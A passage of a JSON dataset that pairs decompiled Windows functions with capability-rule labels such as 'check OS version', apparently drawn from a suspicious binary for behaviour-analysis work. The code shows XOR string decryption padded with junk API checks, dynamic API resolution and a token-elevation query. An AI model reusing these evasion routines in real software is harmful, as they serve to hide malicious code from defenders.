        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040fa9d(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint psz2;\n    uint var_4h;\n    \n    psz2 = *0x41cb28;\n    if (*0x41cdd8 != 0) {\n        return 1;\n    }\n    var_40h = 0x6c106421;\n    var_3ch = 0x6412390f;\n    var_38h = 0x39196c0f;\n    var_34h = 0x6c026418;\n    var_30h = 0x64333918;\n    var_2ch = 0x391d6c30;\n    var_28h = 0x6c116437;\n    var_24h = 0x64323910;\n    var_20h = 0x39106c30;\n    var_1ch = 0x6c176435;\n    var_18h = 0x6439391c;\n    var_14h = 0x39756c0d;\n    var_10h = 0x6c636456;\n    var_ch._0_2_ = 0x3975;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x61);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar4 != 0x9e0d5a) {\n            var_4h = 6;\n            *(iVar5 + iVar3) = *(&var_10h + iVar5 % 6) ^ (iVar5 + iVar3)[&var_40h - iVar3];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x30);\n    *0x41cdd8 = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(0xffffffff, 0, 4, 0, 0x208, iVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41cdd8 != 0) {\n        if ((*0x41cbcc != 0) ||\n           (*0x41cbcc = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(*0x41cdd8, 0xf001f, 0, 0, 0x208),  *0x41cbcc != 0)) {\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(*0x41cbcc, psz2);\n            uVar2 = (*pcVar1)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            return 1;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x41cdd8);\n        *0x41cdd8 = 0;\n    }\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return 0;\n}\n",
        "token_count": 829
    },
    "00401f28": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.00401f28(uint arg_8h, uint arg_ch, uint32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    uint *in_EDX;\n    uint var_4h;\n    \n    do {\n        iVar1 = fcn.00401768(arg_8h, arg_ch, arg_10h, arg_14h, *in_EDX);\n        if (iVar1 != 6) break;\n    } while (*arg_14h <= *arg_10h && *arg_10h != *arg_14h);\n    if (iVar1 != 0) {\n        fcn.00408e0c();\n    }\n    return iVar1;\n}\n",
        "token_count": 182
    },
    "0040b2db": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.0040b2db(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint ReturnLength;\n    uint TokenInformation;\n    uint TokenHandle;\n    \n    TokenInformation = 0;\n    if (*0x41cb40 == 6) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20008, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n        if (iVar2 != 0) {\n            (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    return TokenInformation;\n}\n",
        "token_count": 177
    },
    "00402006": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00402006(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    code *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *hHeap;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_ch = 0;\n    iVar6 = -0x3fffffdd;\n    if ((((param_1 != NULL) && (param_2 != NULL)) && (*param_1 != 0)) && (hHeap = param_1[1],  hHeap != NULL)) {\n        if (*param_1 == *hHeap) {\n            var_38h = 0x92f153f;\n            var_34h = 0xc020b52;\n            var_30h = 0x1b523f33;\n            var_2ch = 0x2b36231e;\n            var_28h = 0x611f0d51;\n            var_24h = 0x4d43616d;\n            var_20h._0_2_ = 0x6837;\n            var_1ch = param_2;\n            var_18h = param_1;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            var_8h = 6;\n            iVar7 = 0;\n            var_10h = &var_38h - iVar6;\n            var_14h = iVar6;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n                if (iVar4 != 0x55f272) {\n                    *(iVar7 + iVar6) = *(&var_24h + iVar7 % var_8h) ^ (iVar7 + iVar6)[var_10h];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x14);\n            var_30h = 0xf034404;\n            var_2ch = 0x5c0e6655;\n            var_28h = CONCAT22(var_28h._2_2_, 0x630b);\n            var_24h = 0x6367306a;\n            var_20h._0_2_ = 0x4839;\n            uVar3 = (*pcVar1)(8, 0xb);\n            iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = 0;\n            var_10h = &var_30h - iVar7;\n            do {\n                iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                iVar4 = var_14h;\n                if (iVar5 != 0xea05b6) {\n                    *(iVar6 + iVar7) = *(&var_24h + iVar6 % var_8h) ^ (iVar6 + iVar7)[var_10h];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 10);\n            uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar7, var_14h);\n            var_14h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n            uVar3 = (*pcVar1)(8, hHeap[1]);\n            var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = *hHeap;\n            var_18h = var_18h[1] + 0xc;\n            fcn.00401f74();\n            piVar2 = hHeap;\n            iVar6 = (*var_14h)(2, var_8h, hHeap[1], var_18h, iVar6 + -0xc, &var_ch);\n            hHeap = iVar6;\n            if (iVar6 == 0) {\n                if (var_ch == piVar2[1]) {\n                    var_1ch[1] = var_8h;\n                    *var_1ch = var_ch;\n                }\n                else {\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    iVar6 = -0x3fffff85;\n                }\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n            pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*pcVar1)(uVar3);\n        }\n        else {\n            iVar6 = -0x3fffff85;\n        }\n    }\n    return iVar6;\n}\n",
        "token_count": 1233
    },
    "004021f2": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004021f2(uchar *param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uchar *var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_4h = 0;\n    var_2ch = param_1;\n    if ((((*0x41caac | *0x41cab0) == 0) || ((*0x41cab4 | *0x41cab8) == 0)) || ((*0x41cabc | *0x41cac0) == 0)) {\n        var_4h = 0x7f;\n        var_28h = 0xf034404;\n        var_24h = 0x5c0e6655;\n        var_20h._0_2_ = 0x630b;\n        var_34h = 0x6367306a;\n        var_30h._0_2_ = 0x4839;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_18h = &var_28h - iVar3;\n        var_14h = iVar3;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n            if (iVar4 != 0xea05b6) {\n                var_1ch = 6;\n                *(iVar7 + iVar3) = *(&var_34h + iVar7 % 6) ^ (iVar7 + iVar3)[var_18h];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 10);\n        var_10h = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar3);\n        if (var_10h == 0) {\n            uVar2 = (*pcVar5)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            return var_4h;\n        }\n        var_38h = 0x74002922;\n        var_34h = 0x36290f36;\n        var_30h._0_2_ = 0x3554;\n        var_30h._2_1_ = 0x6e;\n        var_24h = 0x38724d6e;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x59);\n        uVar2 = (*pcVar5)(8, 0xc);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        var_ch = 5;\n        iVar7 = 0;\n        var_18h = &var_38h - iVar3;\n        var_1ch = iVar3;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            if (iVar4 != 0xff7e3a) {\n                *(iVar7 + iVar3) = *(&var_24h + iVar7 % var_ch) ^ (iVar7 + iVar3)[var_18h];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xb);\n        *0x41caac = fcn.00404e21();\n        iVar7 = var_14h;\n        *0x41cab0 = *0x41caac >> 0x1f;\n        if ((*0x41caac | *0x41cab0) == 0) {\n            uVar2 = (*pcVar5)(0, iVar3);\n            pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar5)(0, iVar7);\n            (*pcVar1)(uVar2);\n            return var_4h;\n        }\n        var_50h = 0x2a4b3514;\n        var_4ch = 0x4b012c54;\n        var_48h = 0x353d5202;\n        var_44h = 0x19541f4c;\n        var_40h = 0x541f5d35;\n        var_3ch._0_1_ = 0x2b;\n        var_3ch._1_1_ = 0x22;\n        var_3ch._2_1_ = 0x39;\n        var_24h = 0x6d395158;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x31);\n        uVar2 = (*pcVar5)(8, 0x18);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_18h = &var_50h - iVar3;\n        var_8h = iVar3;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n            if (iVar4 != 0x602a85) {\n                *(iVar7 + iVar3) = *(&var_24h + iVar7 % var_ch) ^ (iVar7 + iVar3)[var_18h];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x17);\n        *0x41cab4 = fcn.00404e21();\n        iVar7 = var_14h;\n        iVar3 = var_1ch;\n        *0x41cab8 = *0x41cab4 >> 0x1f;\n        if ((*0x41cab4 | *0x41cab8) == 0) {\n            uVar2 = (*pcVar5)(0, var_8h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_50h = 0x3122532;\n            var_4ch = 0x21371c24;\n            var_48h = 0x20011d05;\n            var_44h = 0x42a0436;\n            var_40h = 0x241c271f;\n            var_3ch._0_1_ = 0x1a;\n            var_3ch._1_1_ = 0x2b;\n            var_3ch._2_1_ = 0x42;\n            var_34h = 0x71425268;\n            var_30h._0_2_ = CONCAT11(var_30h._1_1_, 0x4b);\n            uVar2 = (*pcVar5)(8, 0x18);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar7 = 0;\n            var_24h = &var_50h - iVar3;\n            var_18h = iVar3;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetFocus)();\n                if (iVar4 != 0x4e3bd6) {\n                    *(iVar7 + iVar3) = *(&var_34h + iVar7 % var_ch) ^ (iVar7 + iVar3)[var_24h];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x17);\n            *0x41cabc = fcn.00404e21();\n            iVar7 = var_14h;\n            iVar3 = var_1ch;\n            *0x41cac0 = *0x41cabc >> 0x1f;\n            if ((*0x41cabc | *0x41cac0) != 0) {\n                var_4h = 0;\n                uVar2 = (*pcVar5)(0, var_18h);\n                pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                (*pcVar5)(uVar2);\n                pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*pcVar5)(uVar2);\n                uVar2 = (*pcVar1)(0, iVar7);\n                (*pcVar5)(uVar2);\n                goto code_r0x00402528;\n            }\n            uVar2 = (*pcVar5)(0, var_18h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n        }\n        (*pcVar5)(uVar2);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        (*pcVar5)(uVar2);\n        uVar2 = (*pcVar1)(0, iVar7);\n        (*pcVar5)(uVar2);\n    }\n    else {\ncode_r0x00402528:\n        puVar6 = 0x41caac;\n        for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *var_2ch = *puVar6;\n            puVar6 = puVar6 + 1;\n            var_2ch = var_2ch + 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 2356
    },
    "0040253e": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040253e(uchar *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uchar *var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_4h = 0;\n    var_2ch = param_1;\n    if ((((*0x41cac4 | *0x41cac8) == 0) || ((*0x41cacc | *0x41cad0) == 0)) || ((*0x41cad4 | *0x41cad8) == 0)) {\n        var_4h = 0x7f;\n        var_28h = 0xf034404;\n        var_24h = 0x5c0e6655;\n        var_20h._0_2_ = 0x630b;\n        var_34h = 0x6367306a;\n        var_30h._0_2_ = 0x4839;\n        var_14h = param_2;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar8 = 0;\n        var_18h = &var_28h - iVar3;\n        var_10h = iVar3;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n            if (iVar4 != 0xea05b6) {\n                var_1ch = 6;\n                *(iVar8 + iVar3) = *(&var_34h + iVar8 % 6) ^ (iVar8 + iVar3)[var_18h];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 10);\n        var_38h = 0x74002922;\n        var_34h = 0x36290f36;\n        var_30h._0_2_ = 0x3554;\n        var_30h._2_1_ = 0x6e;\n        var_24h = 0x38724d6e;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x59);\n        uVar2 = (*pcVar6)(8, 0xc);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        var_ch = 5;\n        iVar8 = 0;\n        var_18h = &var_38h - iVar3;\n        var_1ch = iVar3;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            iVar4 = var_10h;\n            if (iVar5 != 0xff7e3a) {\n                *(iVar8 + iVar3) = *(&var_24h + iVar8 % var_ch) ^ (iVar8 + iVar3)[var_18h];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0xb);\n        *0x41cac4 = fcn.00405c35(iVar3);\n        if (*0x41cac4 == 0) {\n            uVar2 = (*pcVar6)(0, iVar3);\n            pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar6)(0, iVar4);\n            (*pcVar1)(uVar2);\n            goto code_r0x00402868;\n        }\n        var_50h = 0x2a4b3514;\n        var_4ch = 0x4b012c54;\n        var_48h = 0x353d5202;\n        var_44h = 0x19541f4c;\n        var_40h = 0x541f5d35;\n        var_3ch._0_1_ = 0x2b;\n        var_3ch._1_1_ = 0x22;\n        var_3ch._2_1_ = 0x39;\n        var_24h = 0x6d395158;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x31);\n        uVar2 = (*pcVar6)(8, 0x18);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar8 = 0;\n        var_18h = &var_50h - iVar3;\n        var_8h = iVar3;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n            iVar4 = var_10h;\n            if (iVar5 != 0x602a85) {\n                *(iVar8 + iVar3) = *(&var_24h + iVar8 % var_ch) ^ (iVar8 + iVar3)[var_18h];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x17);\n        *0x41cacc = fcn.00405c35(iVar3);\n        iVar3 = var_1ch;\n        if (*0x41cacc == 0) {\n            uVar2 = (*pcVar6)(0, var_8h);\n            pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_50h = 0x3122532;\n            var_4ch = 0x21371c24;\n            var_48h = 0x20011d05;\n            var_44h = 0x42a0436;\n            var_40h = 0x241c271f;\n            var_3ch._0_1_ = 0x1a;\n            var_3ch._1_1_ = 0x2b;\n            var_3ch._2_1_ = 0x42;\n            var_34h = 0x71425268;\n            var_30h._0_2_ = CONCAT11(var_30h._1_1_, 0x4b);\n            uVar2 = (*pcVar6)(8, 0x18);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar8 = 0;\n            var_24h = &var_50h - iVar3;\n            var_18h = iVar3;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetFocus)();\n                iVar4 = var_10h;\n                if (iVar5 != 0x4e3bd6) {\n                    *(iVar8 + iVar3) = *(&var_34h + iVar8 % var_ch) ^ (iVar8 + iVar3)[var_24h];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 0x17);\n            *0x41cad4 = fcn.00405c35(iVar3);\n            iVar3 = var_1ch;\n            if (*0x41cad4 != 0) {\n                var_4h = 0;\n                uVar2 = (*pcVar6)(0, var_18h);\n                pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                (*pcVar6)(uVar2);\n                pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*pcVar6)(uVar2);\n                uVar2 = (*pcVar1)(0, iVar4);\n                (*pcVar6)(uVar2);\n                goto code_r0x0040285b;\n            }\n            uVar2 = (*pcVar6)(0, var_18h);\n            pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n        }\n        (*pcVar6)(uVar2);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        (*pcVar6)(uVar2);\n        uVar2 = (*pcVar1)(0, iVar4);\n        (*pcVar6)(uVar2);\n    }\n    else {\ncode_r0x0040285b:\n        puVar7 = 0x41cac4;\n        for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *var_2ch = *puVar7;\n            puVar7 = puVar7 + 1;\n            var_2ch = var_2ch + 1;\n        }\n    }\ncode_r0x00402868:\n    *0x41cad8 = *0x41cad4 >> 0x20;\n    *0x41cad0 = *0x41cacc >> 0x20;\n    *0x41cac8 = *0x41cac4 >> 0x20;\n    return var_4h;\n}\n",
        "token_count": 2296
    },
    "00402a3c": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00402a3c(int32_t *arg_8h, int32_t lpStartAddress, int32_t lpParameter, uint32_t arg_14h)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    uint *puVar7;\n    code *pcVar8;\n    int16_t *piVar9;\n    uint uVar10;\n    int32_t iVar11;\n    int32_t *piVar12;\n    int32_t iVar13;\n    int64_t iVar14;\n    uint uVar15;\n    uint uVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    int32_t iVar20;\n    int16_t *piStack132;\n    int32_t iStack128;\n    uint uStack124;\n    int32_t *piStack120;\n    uint uStack116;\n    uint uStack112;\n    int32_t iStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint32_t uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    int32_t iStack56;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    cVar2 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    uStack112 = 0;\n    piVar12 = arg_8h + 1;\n    piStack120 = piVar12;\n    if (*piVar12 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*piVar12);\n        *piVar12 = 0;\n    }\n    uVar10 = 0xffffffff;\n    if (((arg_14h & 0x10) == 0) && ((*0x41cb1c & 1) != 0)) {\n        iStack128 = 5;\n        if (cVar2 == '\\x05') {\n            if ((*0x41cde0 | *0x41cde4) == 0) {\n                fcn.00405723();\n                pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                iVar19 = 0xb;\n                iVar18 = 8;\n                uStack72 = 0xf034404;\n                uStack68 = 0x5c0e6655;\n                uStack64 = CONCAT22(uStack64._2_2_, 0x630b);\n                uStack88 = 0x6367306a;\n                uStack84 = CONCAT22(uStack84._2_2_, 0x4839);\n                uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n                iVar20 = 6;\n                iVar11 = 0;\n                iStack128 = &uStack84 - iVar3;\n                do {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                    if (iVar4 != 0xea05b6) {\n                        *(iVar11 + iVar3) = *(&uStack100 + iVar11 % iVar20) ^ (iVar11 + iVar3)[iStack128];\n                    }\n                    iVar11 = iVar11 + 1;\n                } while (iVar11 < 10);\n                iVar17 = 0xc;\n                uVar16 = 8;\n                uStack84 = 0x74002922;\n                uStack80 = 0x36290f36;\n                uStack76 = uStack76 & 0xff000000 | 0x6e3554;\n                iStack108 = 0x38724d6e;\n                uStack104 = CONCAT31(uStack104._1_3_, 0x59);\n                iVar11 = (*pcVar8)(8, 0xc);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                iVar13 = 0;\n                iVar4 = &uStack96 - iVar3;\n                uVar10 = 0xffffffff;\n                uStack112 = iVar3;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                    if (iVar5 != 0xff7e3a) {\n                        *(iVar13 + iVar3) = *(&piStack120 + iVar13 % iVar18) ^ (iVar13 + iVar3)[iVar4];\n                    }\n                    iVar13 = iVar13 + 1;\n                } while (iVar13 < 0xb);\n                iVar18 = iVar19;\n                iVar14 = fcn.00405c35(iVar3);\n                piStack132 = iVar14;\n                if (iVar14 != 0) {\n                    uVar15 = 0x2d;\n                    uVar10 = 8;\n                    uStack80 = 0x6c225423;\n                    uStack76 = 0x54266924;\n                    uStack72 = 0x693a6c22;\n                    uStack68 = 0x6c26542a;\n                    uStack64 = 0x542d6925;\n                    uStack60 = CONCAT22(uStack60._2_2_, 0x6c47);\n                    uStack104 = 0x6c475448;\n                    uStack100 = CONCAT22(uStack100._2_2_, 0x6956);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x2d);\n                    piVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                    iVar4 = 0;\n                    iVar19 = iVar17;\n                    piStack132 = piVar6;\n                    do {\n                        iVar13 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n                        if (iVar13 != 0x7b684f) {\n                            *(iVar4 + piVar6) = *(&uStack116 + iVar4 % iVar11) ^ (iVar4 + piVar6)[&uStack92 - piVar6];\n                        }\n                        iVar4 = iVar4 + 1;\n                    } while (iVar4 < 0x16);\n                    iStack56 = piVar6 >> 0x1f;\n                    piVar9 = piVar6;\n                    do {\n                        iVar1 = *piVar9;\n                        piVar9 = piVar9 + 1;\n                    } while (iVar1 != iVar18);\n                    iVar1 = (piVar9 - (piVar6 + 1) >> 1) * 2;\n                    uStack64 = 0;\n                    uStack68 = CONCAT22(iVar1 + 2, iVar1);\n                    uStack60 = piVar6;\n                    iVar11 = fcn.0040fc00(iVar20, uVar16, 4, 0, 0, 0, 0, 0, &uStack68, &uStack68 >> 0x1f, &iStack108, \n                                          &iStack108 >> 0x1f, iVar3, uVar10);\n                    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    if (iVar11 < 0) {\n                        uVar10 = fcn.00409c14();\n                    }\n                    else {\n                        uStack92 = 0xa47285b;\n                        uStack88 = 0x2c523b30;\n                        uStack84 = uStack84 & 0xff000000 | 0x550146;\n                        uStack116 = 0x64354d30;\n                        uStack112 = CONCAT22(uStack112._2_2_, 0x5755);\n                        iVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n                        iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                        iVar4 = 0;\n                        iVar20 = &uStack104 - iVar18;\n                        iVar19 = iVar18;\n                        do {\n                            iVar13 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                            if (iVar13 != 0xbfc7be) {\n                                *(iVar4 + iVar18) = *(&iStack128 + iVar4 % iVar3) ^ (iVar4 + iVar18)[iVar20];\n                            }\n                            iVar4 = iVar4 + 1;\n                        } while (iVar4 < 0xb);\n                        uStack104 = 0x590d3004;\n                        uStack100 = 0x27153d3a;\n                        uStack96 = 0x3d3a5705;\n                        uStack92 = 0x5d1a2a13;\n                        uStack88 = uStack88 & 0xff000000 | 0x473c2f;\n                        iStack128 = 0x38684247;\n                        uStack124 = CONCAT22(uStack124._2_2_, 0x584e);\n                        uVar10 = (*pcVar8)(8, 0x14);\n                        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n                        iVar18 = 0;\n                        do {\n                            iVar20 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n                            if (iVar20 != 0x9c0a12) {\n                                